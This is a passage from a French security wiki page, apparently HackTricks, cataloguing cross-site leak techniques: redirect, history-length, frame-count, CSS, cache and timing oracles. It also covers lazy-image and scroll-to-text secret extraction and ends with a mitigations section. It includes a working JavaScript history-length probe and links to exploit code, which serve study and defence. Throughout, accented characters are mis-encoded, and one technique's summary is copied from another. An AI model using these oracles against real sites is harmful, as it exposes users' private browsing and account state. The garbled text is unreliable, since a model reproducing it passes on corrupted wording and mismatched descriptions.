* **Plus d'informations**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **R√©sum√©**: Abuser de la limite de redirection pour d√©tecter les redirections.
* **Exemple de code**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si le nombre **maximal** de **redirections** √† suivre par un navigateur est de **20**, un attaquant pourrait essayer de charger sa page avec **19 redirections** et finalement **envoyer la victime** vers la page test√©e. Si une **erreur** est d√©clench√©e, cela signifie que la page essayait de **rediriger la victime**.

### Longueur de l'historique

* **M√©thodes d'inclusion**: Frames, Pop-ups
* **Diff√©rence d√©tectable**: Redirections
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **R√©sum√©**: Le code JavaScript manipule l'historique du navigateur et peut √™tre acc√©d√© via la propri√©t√© de longueur.
* **Exemple de code**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

L'API d'historique permet au code JavaScript de manipuler l'historique du navigateur, qui **enregistre les pages visit√©es par un utilisateur**. Un attaquant peut utiliser la propri√©t√© de longueur comme m√©thode d'inclusion : pour d√©tecter la navigation JavaScript et HTML.\
En v√©rifiant `history.length`, en faisant naviguer un utilisateur vers une page, en la **rechangeant** en m√™me origine et en v√©rifiant la nouvelle valeur de **`history.length`**.

### Longueur de l'historique avec la m√™me URL

* **M√©thodes d'inclusion**: Frames, Pop-ups
* **Diff√©rence d√©tectable**: Si l'URL est identique √† celle devin√©e
* **R√©sum√©**: Il est possible de deviner si l'emplacement d'une frame/pop-up est dans une URL sp√©cifique en abusant de la longueur de l'historique.
* **Exemple de code**: ci-dessous

Un attaquant pourrait utiliser du code JavaScript pour **manipuler l'emplacement de la frame/pop-up vers une URL devin√©e** et **le changer imm√©diatement en `about:blank`**. Si la longueur de l'historique augmente, cela signifie que l'URL √©tait correcte et qu'elle a eu le temps d'**augmenter car l'URL n'est pas recharg√©e si elle est identique**. Si elle n'a pas augment√©, cela signifie qu'elle a **tent√© de charger l'URL devin√©e** mais parce que nous avons imm√©diatement charg√© **`about:blank`** apr√®s, la **longueur de l'historique n'a jamais augment√©** lors du chargement de l'URL devin√©e.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Comptage des cadres

* **M√©thodes d'inclusion**: Cadres, Pop-ups
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **R√©sum√©**: Lire le nombre de cadres (window.length).
* **Exemple de code**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Compter le **nombre de cadres dans une page web** ouverte via `iframe` ou `window.open` peut aider √† identifier le **statut de l'utilisateur sur cette page**.\
De plus, si la page a toujours le m√™me nombre de cadres, v√©rifier **continuellement** le nombre de cadres peut aider √† identifier un **sch√©ma** qui pourrait divulguer des informations.

Un exemple de cette technique est que dans Chrome, un **PDF** peut √™tre **d√©tect√©** avec le **comptage des cadres** car un `embed` est utilis√© en interne. Il existe des [param√®tres d'URL ouverts](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) qui permettent un certain contr√¥le sur le contenu tel que `zoom`, `view`, `page`, `toolbar` o√π cette technique pourrait √™tre int√©ressante.

### HTMLElements

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **R√©sum√©**: Lire la valeur divulgu√©e pour distinguer entre 2 √©tats possibles
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Certaines pages web peuvent **g√©n√©rer dynamiquement des fichiers multim√©dias** en fonction des informations de l'utilisateur ou ajouter des filigranes qui modifient la taille des m√©dias. Un attaquant peut utiliser les informations divulgu√©es par ces √©l√©ments HTML pour distinguer entre les √©tats possibles.

Certains HTMLElements divulgueront des informations √† des origines crois√©es telles que le type de m√©dia qu'ils sont :

* [HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement) divulgue la `dur√©e` du m√©dia et les temps `buffered`.
* [HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement) divulgue la `videoHeight` et `videoWidth`, certains navigateurs peuvent √©galement avoir `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` et `webkitDecodedFrameCount`.
* [getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality) divulgue le `totalVideoFrames`.
* [HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement) divulgue la `hauteur` et la `largeur`, mais si l'image est invalide, elles seront de 0 et [`image.decode()`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement/decode) sera rejet√©e.

### Propri√©t√© CSS

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **R√©sum√©**: D√©tecter le style du site web en fonction de l'√©tat de l'utilisateur.
* **Exemple de code**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Les applications web peuvent changer le **style du site web en fonction de l'√©tat de l'utilisateur**. Les fichiers CSS en provenance de diff√©rentes origines peuvent √™tre int√©gr√©s √† la page de l'attaquant avec l'**√©l√©ment de lien HTML**, et les **r√®gles** seront **appliqu√©es** √† la page de l'attaquant. Si une page modifie dynamiquement ces r√®gles, un attaquant peut **d√©tecter** ces **diff√©rences** en fonction de l'√©tat de l'utilisateur.\
En tant que technique de fuite, l'attaquant peut utiliser la m√©thode `window.getComputedStyle` pour **lire les propri√©t√©s CSS** d'un √©l√©ment HTML sp√©cifique. En cons√©quence, un attaquant peut lire des propri√©t√©s CSS arbitraires si l'√©l√©ment affect√© et le nom de la propri√©t√© sont connus.

### Historique CSS

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **R√©sum√©**: D√©tecter si le style `:visited` est appliqu√© √† une URL indiquant qu'elle a d√©j√† √©t√© visit√©e
* **Exemple de code**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Selon [**ceci**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), cela ne fonctionne pas dans Chrome en mode sans t√™te.
{% endhint %}

En utilisant le s√©lecteur CSS [`:visited`](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited), il est possible d'appliquer un style diff√©rent aux URL qui ont √©t√© visit√©es.\
Auparavant, il √©tait possible d'utiliser [`getComputedStyle()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle) pour d√©tecter cette diff√©rence, mais maintenant les navigateurs emp√™chent cela en renvoyant toujours des valeurs comme si le lien avait √©t√© visit√© et en limitant les styles pouvant √™tre appliqu√©s en utilisant le s√©lecteur.\
Il peut donc √™tre n√©cessaire de tromper l'utilisateur en cliquant sur une zone o√π le CSS a √©t√© affect√©, cela peut √™tre fait en utilisant [`mix-blend-mode`](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode).\
Il existe √©galement des moyens de le faire sans interaction de l'utilisateur, par exemple en abusant des temps de rendu, cela fonctionne car il faut du temps pour peindre les liens d'une couleur diff√©rente.\
Une preuve de concept a √©t√© fournie dans un rapport de Chromium qui fonctionne en utilisant plusieurs liens pour augmenter la diff√©rence de temps.
### Fuite de X-Frame du document de contenu

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: En-t√™tes
* **Plus d'informations**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **R√©sum√©**: Dans GC, lorsque l'acc√®s √† une page n'est pas autoris√© √† √™tre int√©gr√© sur une page de provenance crois√©e en raison de **X-Frame-Options, une page d'erreur est affich√©e**.
* **Exemple de code**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Dans Chrome, lorsque l'acc√®s √† une page n'est pas autoris√© √† √™tre int√©gr√© sur une page de provenance crois√©e, car l'en-t√™te **X-FrameOptions** (XFO) est d√©fini sur deny ou same-origin, une **page d'erreur est affich√©e √† la place**. Pour les objets, cette page d'erreur peut √™tre **d√©tect√©e en v√©rifiant la propri√©t√© `contentDocument`**. En g√©n√©ral, cette propri√©t√© renvoie null car l'acc√®s √† un document int√©gr√© de provenance crois√©e n'est pas autoris√©. Cependant, en raison du **rendu de Chrome** de la page d'erreur, un **objet de document vide** est renvoy√© √† la place. Cela ne fonctionne pas pour les iframes ou dans d'autres navigateurs. Les d√©veloppeurs peuvent oublier de d√©finir X-Frame-Options pour toutes les pages et en particulier les pages d'erreur manquent souvent de cet en-t√™te. En tant que technique de fuite, un attaquant peut √™tre en mesure de diff√©rencier entre diff√©rents √©tats d'utilisateur en le v√©rifiant.

### D√©tection de t√©l√©chargement

* **M√©thodes d'inclusion**: Frames, Pop-ups
* **Diff√©rence d√©tectable**: En-t√™tes
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **R√©sum√©**: L'attaquant peut d√©tecter les t√©l√©chargements en utilisant des iframes. Si l'iframe est toujours accessible, le fichier a √©t√© t√©l√©charg√©.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

L'en-t√™te `Content-Disposition` ([`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)) indique si le navigateur doit t√©l√©charger le contenu ou l'afficher en ligne.

Si seulement un utilisateur connect√© serait en mesure d'**acc√©der √† une page qui t√©l√©chargera un fichier** car elle utilise l'en-t√™te. Il est possible de d√©tecter ce comportement.

#### Barre de t√©l√©chargement <a href="#download-bar" id="download-bar"></a>

Dans les navigateurs bas√©s sur Chromium, lorsqu'un fichier est t√©l√©charg√©, un aper√ßu du processus de t√©l√©chargement **appara√Æt dans une barre en bas**, int√©gr√©e √† la fen√™tre du navigateur. En **surveillant la hauteur de la fen√™tre**, les attaquants peuvent d√©tecter si la "barre de t√©l√©chargement" s'est ouverte.

#### Navigation de t√©l√©chargement (avec iframes) <a href="#download-navigation-with-iframes" id="download-navigation-with-iframes"></a>

Une autre fa√ßon de tester l'en-t√™te [`Content-Disposition: attachment`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition) consiste √† **v√©rifier si une navigation s'est produite**. Si un chargement de page provoque un t√©l√©chargement, cela ne d√©clenche pas de navigation et la **fen√™tre reste dans la m√™me origine**.

#### Navigation de t√©l√©chargement (sans iframes) <a href="#download-navigation-without-iframes" id="download-navigation-without-iframes"></a>

M√™me technique que la pr√©c√©dente, mais en utilisant `window.open` au lieu des iframes.

### Contournement de la mise en cache HTTP partitionn√©e <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Timing
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **R√©sum√©**: L'attaquant peut d√©tecter les t√©l√©chargements en utilisant des iframes. Si l'iframe est toujours accessible, le fichier a √©t√© t√©l√©charg√©.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (√† partir de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
C'est pourquoi cette technique est int√©ressante : Chrome dispose maintenant d'une **partition de cache**, et la cl√© de cache de la page nouvellement ouverte est : `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, mais si j'ouvre une page ngrok et que j'utilise fetch dedans, la cl√© de cache sera : `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **cl√© de cache est diff√©rente**, donc le cache ne peut pas √™tre partag√©. Vous pouvez trouver plus de d√©tails ici : [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Commentaire provenant d'**ici**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un site `example.com` inclut une ressource de `*.example.com/resource`, alors cette ressource aura la **m√™me cl√© de mise en cache** que si la ressource √©tait directement **demand√©e via une navigation de premier niveau**. Cela est d√ª au fait que la cl√© de mise en cache est compos√©e de l'eTLD+1 de premier niveau et de l'eTLD+1 du cadre.

√âtant donn√© que l'acc√®s au cache est plus rapide que le chargement d'une ressource, il est possible d'essayer de changer l'emplacement d'une page et de l'annuler 20 ms (par exemple) apr√®s. Si l'origine a chang√© apr√®s l'arr√™t, cela signifie que la ressource a √©t√© mise en cache.\
Ou vous pouvez simplement **envoyer une requ√™te fetch vers la page potentiellement mise en cache et mesurer le temps que cela prend**.

### Redirection manuelle <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Redirections
* **Plus d'informations**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **R√©sum√©**: Il est possible de savoir si une r√©ponse √† une requ√™te fetch est une redirection.
* **Exemple de code**:

![](<../.gitbook/assets/image (652).png>)
### Fetch avec AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Timing
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **R√©sum√©**: Il est possible d'essayer de charger une ressource et d'interrompre le chargement avant qu'il ne soit termin√©. Selon que une erreur est d√©clench√©e ou non, la ressource a √©t√© ou n'a pas √©t√© mise en cache.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

[**`AbortController`**](https://developer.mozilla.org/en-US/docs/Web/API/AbortController) peut √™tre combin√© avec _**fetch**_ et _**setTimeout**_ pour d√©tecter si la **ressource est mise en cache** et pour supprimer une ressource sp√©cifique du cache du navigateur. Une caract√©ristique int√©ressante de cette technique est que la sonde se produit sans mettre en cache de nouveau contenu dans le processus.

### Pollution de script

* **M√©thodes d'inclusion**: √âl√©ments HTML (script)
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **R√©sum√©**: Lorsqu'un **script cross-origin** est inclus sur une page, il n'est pas possible de lire directement son contenu. Cependant, si un script utilise des **fonctions int√©gr√©es**, il est possible de les **√©craser** et de lire leurs arguments, ce qui peut **r√©v√©ler des informations pr√©cieuses**.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **R√©sum√©**: Mesurer le temps d'ex√©cution d'un site web en utilisant des service workers.
* **Exemple de code**:

1. L'attaquant enregistre un service worker dans l'un de ses domaines (attacker.com).
2. Dans le document principal, l'attaquant effectue une navigation (window.open) vers le site cible et demande au service worker de d√©marrer un minuteur.
3. Lorsque la nouvelle fen√™tre commence √† se charger, l'attaquant navigue vers la r√©f√©rence obtenue √† l'√©tape 2 vers une page g√©r√©e par le service worker.
4. Lorsque la requ√™te effectu√©e √† l'√©tape 3 arrive au service worker, celui-ci renvoie une r√©ponse 204 (No Content), ce qui interrompt la navigation.
5. √Ä ce stade, le service worker collecte une mesure √† partir du minuteur d√©marr√© √† l'√©tape 2. Cette mesure est affect√©e par la dur√©e pendant laquelle JavaScript a bloqu√© la navigation.

{% hint style="warning" %}
Dans une mesure d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Timing de Fetch

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement en raison du contenu de la page, du code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **R√©sum√©**: L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Timing entre fen√™tres

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement en raison du contenu de la page, du code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **R√©sum√©**: L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te en utilisant `window.open`. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et automatiser facilement des flux de travail aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Avec HTML ou r√©injection

Ici, vous trouverez des techniques pour exfiltrer des informations √† partir d'un HTML cross-origin en **injectant du contenu HTML**. Ces techniques sont int√©ressantes dans les cas o√π, pour une raison quelconque, vous pouvez **injecter du HTML mais vous ne pouvez pas injecter de code JS**.

### Balisage suspendu

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Chargement diff√©r√© des images

Si vous devez **exfiltrer du contenu** et que vous pouvez **ajouter du HTML avant le secret**, vous devriez v√©rifier les **techniques de balisage suspendu courantes**.\
Cependant, si pour une raison quelconque vous **DEVEZ** le faire **caract√®re par caract√®re** (peut-√™tre que la communication se fait via un cache hit), vous pouvez utiliser cette astuce.

Les **images** en HTML ont un attribut "**loading**" dont la valeur peut √™tre "**lazy**". Dans ce cas, l'image sera charg√©e lorsqu'elle sera affich√©e et non pendant le chargement de la page :
```html
<img src=/something loading=lazy >
```
Par cons√©quent, ce que vous pouvez faire, c'est **ajouter beaucoup de caract√®res ind√©sirables** (par exemple, **des milliers de "W"**) pour **remplir la page web avant le secret ou ajouter quelque chose comme** `<br><canvas height="1850px"></canvas><br>.`\
Ensuite, si par exemple notre **injection appara√Æt avant le drapeau**, l'**image** sera **charg√©e**, mais si elle appara√Æt **apr√®s** le **drapeau**, le drapeau + les caract√®res ind√©sirables **emp√™cheront son chargement** (vous devrez jouer avec la quantit√© de caract√®res ind√©sirables √† placer). C'est ce qui s'est pass√© dans [**ce compte rendu**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Une autre option serait d'utiliser le **scroll-to-text-fragment** si cela est autoris√© :

#### Scroll-to-text-fragment

Cependant, vous pouvez faire en sorte que le **robot acc√®de √† la page** avec quelque chose comme
```
#:~:text=SECR
```
La page web sera quelque chose comme : **`https://victim.com/post.html#:~:text=SECR`**

O√π post.html contient les caract√®res ind√©sirables de l'attaquant et une image en chargement diff√©r√©, puis le secret du bot est ajout√©.

Ce texte permettra au bot d'acc√©der √† n'importe quel texte de la page contenant le texte `SECR`. Comme ce texte est le secret et qu'il se trouve juste **sous l'image**, l'image ne se chargera que si le secret devin√© est correct. Vous avez donc votre oracle pour **extraire le secret caract√®re par caract√®re**.

Voici un exemple de code pour exploiter cela : [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Chargement diff√©r√© de l'image bas√© sur le temps

S'il n'est pas possible de charger une image externe qui pourrait indiquer √† l'attaquant que l'image a √©t√© charg√©e, une autre option serait d'essayer de **deviner le caract√®re plusieurs fois et de mesurer cela**. Si l'image est charg√©e, toutes les requ√™tes prendront plus de temps que si l'image n'est pas charg√©e. C'est ce qui a √©t√© utilis√© dans la [**solution de cette explication**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **r√©sum√©e ici :**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si `jQuery(location.hash)` est utilis√©, il est possible de d√©terminer, par le biais du timing, **si un contenu HTML existe**, cela est d√ª au fait que si le s√©lecteur `main[id='site-main']` ne correspond pas, il n'est pas n√©cessaire de v√©rifier le reste des **s√©lecteurs** :
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Injection CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## D√©fenses

Dans cette section, vous pouvez trouver une partie des att√©nuations recommand√©es dans [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), cependant, il existe d'autres att√©nuations dans chaque section du wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consultez ces ressources pour obtenir plus d'informations sur la fa√ßon de se prot√©ger contre ces techniques.

### Att√©nuations des m√©thodes d'inclusion

* **√âl√©ments HTML**. Il est possible d'utiliser l'en-t√™te **CORP pour contr√¥ler si les pages peuvent int√©grer une ressource**. CORP peut √™tre d√©fini sur same-origin ou same-site et bloque respectivement les requ√™tes cross-origin ou cross-site vers cette ressource. Du c√¥t√© **client**, les navigateurs bas√©s sur Chromium utilisent l'algorithme **CORB** pour d√©cider si les requ√™tes de ressources cross-origin doivent √™tre autoris√©es ou refus√©es.
* **Cadres**. La principale d√©fense pour **emp√™cher les √©l√©ments iframe** de charger des ressources HTML est l'utilisation de **X-Frame-Options**. Alternativement, la directive **frame-ancestors CSP** peut obtenir un r√©sultat similaire. Si l'int√©gration est refus√©e, la m√©thode d'inclusion ne peut pas d√©tecter de diff√©rence dans les r√©ponses.
* **Pop-ups**. Pour restreindre l'acc√®s √† `window.opener`, l'en-t√™te de r√©ponse HTTP **COOP** d√©finit trois valeurs diff√©rentes : unsafe-none (par d√©faut), same-origin-allow-popups et same-origin. Ces valeurs peuvent √™tre utilis√©es pour **isoler les onglets de navigation et les pop-ups** et ainsi att√©nuer les techniques de fuite bas√©es sur les pop-ups.
* **Requ√™tes JavaScript**. Les requ√™tes JavaScript cross-origin sont souvent utilis√©es dans les attaques XS-Leak, car un attaquant a un contr√¥le pr√©cis sur la requ√™te √©mise. Cependant, comme ces requ√™tes ne sont pas activ√©es pour CORS, elles sont soumises aux m√™mes restrictions que les requ√™tes envoy√©es par des √©l√©ments HTML, tels que les scripts ou les images. Ainsi, l'impact de cette technique de fuite peut √©galement √™tre **att√©nu√© par CORP et CORB**.

M√©thodes plus g√©n√©riques :

* **M√©tadonn√©es Fetch**. Ces en-t√™tes de requ√™te permettent aux propri√©taires de serveurs de mieux comprendre comment le navigateur de l'utilisateur a provoqu√© une requ√™te sp√©cifique. Dans Chrome, les en-t√™tes Sec-Fetch-\* sont automatiquement ajout√©s √† chaque requ√™te et fournissent des m√©tadonn√©es sur la provenance de la requ√™te. Par exemple, Sec-Fetch-Dest: image a √©t√© d√©clench√© √† partir d'un √©l√©ment image. Les applications Web peuvent ensuite choisir de bloquer les requ√™tes en fonction de ces informations.
* **Cookies Same-Site**. Le drapeau Same-Site pour les cookies permet aux sites Web de d√©clarer **si un cookie doit √™tre restreint au contexte same-site ou first-party**. Tous les principaux navigateurs prennent en charge les cookies Same-Site. Dans GC, les cookies sans cet attribut sont d√©sormais Lax par d√©faut. Pour les XS-Leaks, **les cookies Same-Site limitent consid√©rablement les possibilit√©s d'attaque de fuite**. En revanche, les techniques de fuite qui reposent sur **`window.open` fonctionnent toujours avec `SameSite=Lax`**. Les sites Web qui utilisent **d'autres m√©thodes d'authentification**, telles que les certificats c√¥t√© client et l'authentification HTTP, **restent vuln√©rables**.
* **D√©solidarisation des identifiants cross-origin (COIU)**. COIU, √©galement connu sous le nom d'Isolation de la premi√®re partie (FPI), est une fonctionnalit√© de s√©curit√© facultative que les utilisateurs peuvent activer dans les param√®tres avanc√©s de FF (about:config) et qui a √©t√© initialement introduite dans le navigateur Tor. Dans une vue abstraite, il s'agit d'un contexte same-site √©tendu. Il **lie plusieurs ressources** (par exemple, les cookies, le cache, les stockages c√¥t√© client) **√† la premi√®re partie** au lieu de les partager entre tous les sites visit√©s. S'il est activ√©, COIU r√©duit consid√©rablement l'applicabilit√© des XS-Leaks, car seules les m√©thodes utilisant des pop-ups sont encore possibles pour r√©pondre √† l'exigence de la premi√®re partie de la politique.
* **Protections contre le suivi**. Apple a mis en place un m√©canisme de confidentialit√© appel√© **Intelligent Tracking Prevention (ITP)** dans SA qui vise √† lutter contre le suivi inter-sites en limitant les capacit√©s des cookies et d'autres API Web. Dans les versions plus r√©centes de SA, ITP bloque tous les cookies tiers par d√©faut, sans exception \[74]. Ce blocage emp√™che toutes les fuites qui ne sont pas bas√©es sur des pop-ups. FF a adopt√© une approche similaire avec Enhanced Tracking Prevention (ETP), mais ils ne bloquent que des cookies tiers sp√©cifiques appartenant √† des fournisseurs de suivi. Dans le contexte des XS-Leaks, ETP att√©nue uniquement les techniques de fuite qui ciblent ces domaines de suivi.
* **Extensions de navigateur**. Les utilisateurs conscients de la s√©curit√© peuvent utiliser des **extensions de navigateur pour pr√©venir certaines m√©thodes d'inclusion**.

### Att√©nuations des techniques de fuite

